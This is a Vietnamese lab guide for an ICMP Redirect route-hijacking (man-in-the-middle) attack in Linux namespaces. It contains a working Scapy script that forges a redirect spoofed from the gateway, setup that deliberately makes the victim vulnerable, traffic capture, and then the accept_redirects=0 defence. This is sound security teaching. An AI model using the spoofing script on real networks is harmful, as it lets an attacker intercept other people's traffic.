# HƯỚNG DẪN THỰC HÀNH: LAB 05
## ICMP Redirect Attack (Route Hijacking / MITM)

---

### 1. MỤC TIÊU & MÔ HÌNH MẠNG
- **Mục tiêu:** Chiếm quyền định tuyến (Route Hijacking / Man-in-the-Middle) bằng gói tin ICMP Redirect giả mạo (`Type 5`, `Code 1`) từ Default Gateway (`10.0.0.1`), ép nạn nhân (`10.0.0.2`) cập nhật FIB Nexthop Exception chuyển hướng toàn bộ lưu lượng tới máy chủ ngoài (`10.0.1.5`) đi qua máy kẻ tấn công (`10.0.0.66`). Sau đó kiểm chứng phòng thủ `accept_redirects = 0`.
- **Topology:**
  - Subnet LAN `10.0.0.0/24` (trên `br0`): `vic` (`10.0.0.2`), `gw` (`10.0.0.1`), `atk` (`10.0.0.66`).
  - Subnet WAN `10.0.1.0/24`: Router `gw` (`10.0.1.254`) nối với máy chủ đích `dst` (`10.0.1.5`).

> 💡 **Quy ước thực thi lệnh:**
> - `[VICTIM - vic]`: Lệnh chạy trong namespace nạn nhân (tiền tố `ip netns exec vic`).
> - `[ATTACKER - atk]`: Lệnh chạy trong namespace kẻ tấn công (tiền tố `ip netns exec atk`).
> - `[ROUTER / GATEWAY - gw]`: Lệnh chạy trên router biên (tiền tố `ip netns exec gw`).
> - `[MÁY CHỦ ĐÍCH - dst]`: Lệnh chạy trên máy chủ đích (tiền tố `ip netns exec dst`).
> - `[HOST / CHUNG]`: Lệnh chạy trực tiếp trên máy ảo Kali.

---

### 2. BƯỚC 1: KHỞI TẠO THƯ MỤC VÀ TẠO CÁC SCRIPT

Tạo thư mục `/tmp/lab05` và tạo 2 script bằng `cat << 'EOF'` (hoặc dùng `nano <tên_file>` để soạn thảo):

```bash
mkdir -p /tmp/lab05 && cd /tmp/lab05

# 1. Script thiết lập mạng đa subnet: setup_redirect.sh
cat << 'EOF' > /tmp/lab05/setup_redirect.sh
#!/usr/bin/env bash
set -e

echo "[*] Dọn dẹp namespace cũ và bridge..."
for ns in vic gw atk dst amp1 amp2 amp3 h1 h2; do
    ip netns del "$ns" 2>/dev/null || true
done
ip link del br0 2>/dev/null || true

echo "[*] Tạo Linux Bridge br0 cho LAN 10.0.0.0/24..."
ip link add name br0 type bridge
ip link set dev br0 up

add_lan_host() {
    local ns=$1; local ip=$2
    ip netns add "$ns"
    ip link add "veth_${ns}" type veth peer name "${ns}0"
    ip link set "${ns}0" netns "$ns"
    ip link set "veth_${ns}" master br0
    ip link set "veth_${ns}" up
    ip netns exec "$ns" ip link set dev lo up
    ip netns exec "$ns" ip addr add "${ip}/24" brd 10.0.0.255 dev "${ns}0"
    ip netns exec "$ns" ip link set dev "${ns}0" up
}
add_lan_host "vic" "10.0.0.2"
add_lan_host "gw"  "10.0.0.1"
add_lan_host "atk" "10.0.0.66"

# Tạo mạng WAN nối gw tới dst
ip netns add "dst"
ip netns exec dst ip link set dev lo up
ip link add "gw-d" type veth peer name "d-gw"
ip link set "gw-d" netns "gw"
ip link set "d-gw" netns "dst"
ip netns exec gw ip addr add 10.0.1.254/24 dev gw-d
ip netns exec gw ip link set dev gw-d up
ip netns exec dst ip addr add 10.0.1.5/24 dev d-gw
ip netns exec dst ip link set dev d-gw up

# Cấu hình routing & forwarding
ip netns exec gw sysctl -w net.ipv4.ip_forward=1
ip netns exec gw sysctl -w net.ipv4.conf.all.send_redirects=0
ip netns exec vic ip route add default via 10.0.0.1 dev vic0
ip netns exec atk ip route add default via 10.0.0.1 dev atk0
ip netns exec dst ip route add default via 10.0.1.254 dev d-gw

# Cấu hình vic chấp nhận Redirect (Tái tạo điều kiện dễ bị tấn công)
for k in all default vic0; do
    ip netns exec vic sysctl -w net.ipv4.conf.$k.accept_redirects=1
    ip netns exec vic sysctl -w net.ipv4.conf.$k.secure_redirects=0
done

# Khởi động ARP cache
ip netns exec vic ping -c 1 -W 1 10.0.0.1 >/dev/null 2>&1 || true
ip netns exec vic ping -c 1 -W 1 10.0.0.66 >/dev/null 2>&1 || true
ip netns exec atk ping -c 1 -W 1 10.0.0.1 >/dev/null 2>&1 || true
ip netns exec gw  ping -c 1 -W 1 10.0.1.5 >/dev/null 2>&1 || true

echo "[+] Môi trường mạng Lab 05 đã sẵn sàng!"
EOF
chmod +x /tmp/lab05/setup_redirect.sh

# 2. Script tiêm gói ICMP Redirect: send_redirect.py
cat << 'EOF' > /tmp/lab05/send_redirect.py
#!/usr/bin/env python3
from scapy.all import IP, ICMP, UDP, send

LEGIT_GW = "10.0.0.1"
VICTIM_IP = "10.0.0.2"
ATTACKER_GW = "10.0.0.66"
DEST_IP = "10.0.1.5"

# Nhúng gói IP gốc khớp với luồng giao tiếp của ứng dụng (RFC 1122 4-tuple matching)
orig = IP(src=VICTIM_IP, dst=DEST_IP) / UDP(sport=12345, dport=80)

# ICMP Type 5 = Redirect, Code 1 = Host Redirect, gw = IP máy attacker
redir = IP(src=LEGIT_GW, dst=VICTIM_IP) / ICMP(type=5, code=1, gw=ATTACKER_GW) / orig

send(redir, verbose=0)
print(f"[+] Đã tiêm gói ICMP Redirect giả mạo từ {LEGIT_GW}: Chuyển hướng đích {DEST_IP} qua {ATTACKER_GW}")
EOF
```

---

### 3. BƯỚC 2: CHẠY THIẾT LẬP MẠNG & XÁC NHẬN BASELINE ROUTE

```bash
# [HOST / CHUNG] Thiết lập topology mạng LAN bridge & WAN
sudo bash /tmp/lab05/setup_redirect.sh

# [VICTIM - vic] Kiểm tra đường đi ban đầu trên vic:
sudo ip netns exec vic ip route get 10.0.1.5
# Kỳ vọng: via 10.0.0.1 dev vic0
```

---

### 4. BƯỚC 3: PHÁT ĐỘNG TẤN CÔNG & BẺ LÁI ĐỊNH TUYẾN

1. **[ATTACKER - atk]** Bật IP Forwarding trên `atk` để đóng vai trò Man-in-the-Middle:
   ```bash
   sudo ip netns exec atk sysctl -w net.ipv4.ip_forward=1
   ```
2. **[ATTACKER - atk]** Mở `tcpdump` trên `atk0` đón bắt lưu lượng bị bẻ lái:
   ```bash
   sudo ip netns exec atk tcpdump -i atk0 -nn host 10.0.1.5 > /tmp/lab05/tcpdump_mitm.log 2>&1 &
   sleep 1
   ```
3. **[VICTIM / ATTACKER]** Mở một socket UDP trên `vic` (chạy ngầm trong 2s) và tiêm gói ICMP Redirect từ `atk`:
   ```bash
   # [VICTIM - vic]
   sudo ip netns exec vic python3 -c '
   import socket, time
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   s.bind(("10.0.0.2", 12345))
   s.connect(("10.0.1.5", 80))
   s.send(b"hello")
   time.sleep(1.5)
   ' &
   sleep 0.3
   # [ATTACKER - atk]
   sudo ip netns exec atk python3 /tmp/lab05/send_redirect.py
   sleep 1
   ```
4. **[VICTIM - vic]** Kiểm tra bảng định tuyến trên `vic` ngay sau khi tiêm gói:
   ```bash
   sudo ip netns exec vic ip route get 10.0.1.5
   ```
   > **Quan sát:** Tuyến đường xuất hiện nhãn:  
   > `10.0.1.5 via 10.0.0.66 dev vic0 src 10.0.0.2 cache <redirected> expires 295sec`.  
   > Toàn bộ lưu lượng đã bị ép chuyển hướng qua máy `10.0.0.66`!

5. **[VICTIM / ATTACKER]** Từ `vic`, gửi ping thử tới `10.0.1.5` để quan sát lưu lượng chảy qua attacker:
   ```bash
   # [VICTIM - vic]
   sudo ip netns exec vic ping -c 2 10.0.1.5
   sleep 2
   # [ATTACKER - atk]
   cat /tmp/lab05/tcpdump_mitm.log
   ```
   > **Quan sát:** `atk0` bắt trọn các gói tin ICMP của nạn nhân gửi tới `10.0.1.5`.

---

### 5. BƯỚC 4: KÍCH HOẠT PHÒNG THỦ & KIỂM CHỨNG LẠI

1. **[VICTIM - vic]** Tắt tính năng chấp nhận ICMP Redirect trên `vic` và xóa cache bị nhiễm độc:
   ```bash
   for k in all default vic0; do
       sudo ip netns exec vic sysctl -w net.ipv4.conf.$k.accept_redirects=0
   done
   sudo ip netns exec vic ip route flush cache
   ```
2. **[ATTACKER - atk]** Tiêm lại gói ICMP Redirect từ `atk`:
   ```bash
   sudo ip netns exec atk python3 /tmp/lab05/send_redirect.py
   sleep 1
   ```
3. **[VICTIM - vic]** Kiểm tra lại bảng định tuyến của `vic`:
   ```bash
   sudo ip netns exec vic ip route get 10.0.1.5
   ```
   > **Quan sát:** Tuyến đường giữ nguyên `via 10.0.0.1`, hoàn toàn bỏ qua gói Redirect giả mạo.

---

### 6. BƯỚC 5: DỌN DẸP MÔI TRƯỜNG

```bash
# [HOST / CHUNG] Tắt tiến trình nền và xóa môi trường lab
sudo pkill -f tcpdump 2>/dev/null || true
for ns in vic gw atk dst; do sudo ip netns del $ns 2>/dev/null || true; done
sudo ip link del br0 2>/dev/null || true
sudo rm -rf /tmp/lab05
```
